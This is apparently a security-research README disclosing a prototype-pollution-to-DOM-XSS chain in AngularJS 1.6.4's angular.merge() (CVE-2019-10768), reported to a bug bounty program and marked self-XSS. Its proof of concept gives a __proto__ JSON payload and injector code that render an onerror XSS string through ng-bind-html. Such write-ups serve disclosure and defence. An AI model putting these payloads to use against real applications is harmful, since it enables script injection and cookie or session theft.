# 🧨 Prototype Pollution → Stored XSS via AngularJS 1.6.4

This repository documents a **client-side vulnerability** that combines **Prototype Pollution** and **DOM-Based XSS** in a web application using **AngularJS v1.6.4**. The issue was identified and reported as part of an educational security research effort.

---

## 📚 Description

AngularJS 1.6.4 is vulnerable to **Prototype Pollution** through its `angular.merge()` function. When an attacker is able to modify `Object.prototype` with arbitrary properties (e.g., `innerHTML`), and these properties are later rendered via AngularJS features such as `ng-bind-html` and `$sce.trustAsHtml()`, it can lead to arbitrary JavaScript execution (**XSS**) in the victim's browser.

---

## ⚙️ Affected Technology

- Framework: **AngularJS v1.6.4**
- Vulnerable Function: `angular.merge()`
- Associated CVE: [CVE-2019-10768](https://nvd.nist.gov/vuln/detail/CVE-2019-10768)
- Vulnerability Type: `Prototype Pollution → DOM-Based XSS`
- CWE Classifications:
  - [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes (Prototype Pollution)](https://cwe.mitre.org/data/definitions/1321.html)
  - [CWE-79: Cross-Site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)

---

## 🧪 Proof of Concept (PoC)

### Step 1 – Prototype Pollution

```js
angular.merge({}, JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(1337)>","polluted":"yes"}}'));
console.log({}.polluted); // prints: "yes"

Step 2 – Triggering the Sink (ng-bind-html)

angular.element(document.body).injector().invoke(
  ['$compile', '$rootScope', '$sce', function($compile, $rootScope, $sce) {
    $rootScope.test = { innerHTML: $sce.trustAsHtml('<img src=x onerror=alert(1337)>') };
    const el = angular.element('<div ng-bind-html="test.innerHTML"></div>');
    document.body.appendChild(el[0]);
    $compile(el)($rootScope);
    $rootScope.$digest();
  }]
);

✅ This triggers alert(1337), confirming the execution of injected JavaScript.
🎯 Impact

    Type of XSS: DOM-Based XSS

    Current Entry Vector: Developer console (self-XSS)

    Potential Real-World Impact:

        Cookie or token theft

        Session hijacking

        Internal phishing or persistent client-side injection (if an external input vector is found)

📊 CVSS Score

CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N
Base Score: 6.1 (Medium)

🔬 Real-World Exploitability

Currently, exploitation requires access to the browser console (self-XSS). However, if an attacker finds a way to inject data into an object passed to angular.merge() (via URL parameters, cookies, localStorage, or API calls), this vulnerability can escalate to:

    ✅ Stored XSS

    ✅ Reflected XSS

    ✅ Persistent client-side compromise

An automated injection vector is currently under investigation.
📎 HackerOne-Style Report

This vulnerability was responsibly disclosed to the NBA Bug Bounty Program. The initial triage marked it as self-XSS, but the issue remains technically valid as a Prototype Pollution vulnerability with real XSS impact potential.
⚠️ Disclaimer

This proof of concept is for educational and research purposes only. No unauthorized testing or exploitation was conducted against any live systems.
